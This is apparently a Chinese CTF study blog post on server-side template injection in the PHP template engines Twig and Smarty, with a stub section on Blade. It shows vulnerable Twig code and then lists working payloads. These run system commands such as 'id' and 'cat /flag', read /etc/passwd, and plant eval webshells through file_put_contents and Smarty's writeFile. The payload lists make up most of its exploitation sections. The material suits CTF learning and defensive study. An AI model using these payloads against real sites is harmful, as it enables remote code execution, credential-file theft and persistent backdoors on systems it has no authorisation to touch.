---
title: SSTI-PHP
author: Creexile
date: 2026-06-22
lastMod: 2026-06-22
summary: ''
cover: ''
category: 'CTF'
draft: false
comments: false
sticky: 0
tags: [CTF, CTF知识, SSTI, PHP, XSS]
---

php常见的模板: twig, smarty, blade

# twig

```php
<?php
　　require_once dirname(__FILE__).'\twig\lib\Twig\Autoloader.php';
　　Twig_Autoloader::register(true);
　　$twig = new Twig_Environment(new Twig_Loader_String());
　　$output = $twig->render("Hello {{name}}", array("name" => $_GET["name"]));  // 将用户输入作为模版变量的值
　　echo $output;
?>
```

Twig使用一个加载器来定位模板，以及一个环境变量来存储配置信息. 其中`render()`方法通过其第一个参数载入模板, 并通过第二个参数中的变量来渲染模板.

使用Twig模版引擎渲染页面,其中模版含有`{{name}}`变量，其模版变量值来自于GET请求参数`$_GET["name"]`. 但由于模版引擎一般都默认对渲染的变量值进行编码和转义, 所以这段代码并不会造成跨站脚本攻击.

## 解析

在这个实例中如果randen可控,那就是SSTI漏洞了:

```php
<?php
　　require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
　　Twig_Autoloader::register(true);
　　$twig=newTwig_Environment(newTwig_Loader_String());
　　$output=$twig->render("Hello {$_GET['name']}");// 将用户输入作为模版内容的一部分
　　echo $output;?>
```

用例也是非常经典的`{{8*8}}`, 存在SSTI的会输出64.

## 利用

下面是一些payload

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")}}
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}
```

# Smarty

Smarty是最流行的PHP模板语言之一, 为不受信任的模板执行提供了安全模式. 这会强制执行在php安全函数白名单中的函数, 因此我们在模板中无法直接调用php中直接执行命令的函数.

## 解析

阅读[官方文档](https://github.com/smarty-php/smarty)可以让我们找到一些妙妙工具,比如`$smarty`这个内置变量用于访问各种环境变量, 在通过self得到smarty这个类之后就可以寻找其中的方法.

第一种, 比如`getStreamVariable()`方法可以获取传入变量的流, 可以用这个方法读文件.

```php
{self::getStreamVariable("file:///etc/passwd")}
```

另外一种, `Smarty_Internal_Write_File::writeFile()`是Smarty内部用于写入编译后模板文件的核心静态方法, 我们将利用它写入文件

```php
class Smarty_Internal_Write_File
{
    /**
     * Writes file in a safe way to disk
     *
     * @param  string $_filepath complete filepath
     * @param  string $_contents file content
     * @param  Smarty $smarty    smarty instance
     *
     * @throws SmartyException
     * @return boolean true
     */
    public function writeFile($_filepath, $_contents, Smarty $smarty)
    {
        $_error_reporting = error_reporting();
        error_reporting($_error_reporting & ~E_NOTICE & ~E_WARNING);
        if ($smarty->_file_perms !== null) {
            $old_umask = umask(0);
        }
    ...
    }
}
```

`$SCRIPT_NAME`是PHP 预定义变量, 代表当前脚本文件名.用它作为目标文件名, 写入的文件会覆盖当前页面, 访问该页面即可触发恶意代码.

`self::clearConfig()`作为`writeFile`方法的第三个参数, self 指向当前类(在模板解析时通常是Smarty类), 用于获取配置信息以满足方法参数要求

差不多就是这样

```php
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval($_GET['cmd']); ?>",self::clearConfig())}
```

## 利用

常规利用如下

```php
{$smarty.version}  #获取smarty的版本号
{php}phpinfo();{/php}  #执行相应的php代码
<script language="php">phpinfo();</script>
{if phpinfo()}{/if}
{if system("id")}{/if}
```

再来看看函数的

Smarty类的getStreamVariable方法(_已失效_)

```php
{self::getStreamVariable("file:///etc/passwd")}
```

可以看到这个方法可以读取一个文件并返回其内容

```php
public function getStreamVariable($variable)
{
        $_result = '';
        $fp = fopen($variable, 'r+');
        if ($fp) {
            while (!feof($fp) && ($current_line = fgets($fp)) !== false) {
                $_result .= $current_line;
            }
            fclose($fp);
            return $_result;
        }
        $smarty = isset($this->smarty) ? $this->smarty : $this;
        if ($smarty->error_unassigned) {
            throw new SmartyException('Undefined stream variable "' . $variable . '"');
        } else {
            return null;
        }
    }
```

这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty, 而且在3.1.30的Smarty版本中官方已经把该静态方法删除, 对于那些文章提到的利用`Smarty_Internal_Write_File`类的`writeFile`方法来写shell也由于同样的原因无法使用

# Blade

Blade 是 Laravel 提供的一个既简单又强大的模板引擎

参考文章:

1. [SSTI（模板注入）漏洞（入门篇）](https://www.cnblogs.com/bmjoker/p/13508538.html)
2. [TWIG 全版本通用 SSTI payloads](https://xz.aliyun.com/news/7113)
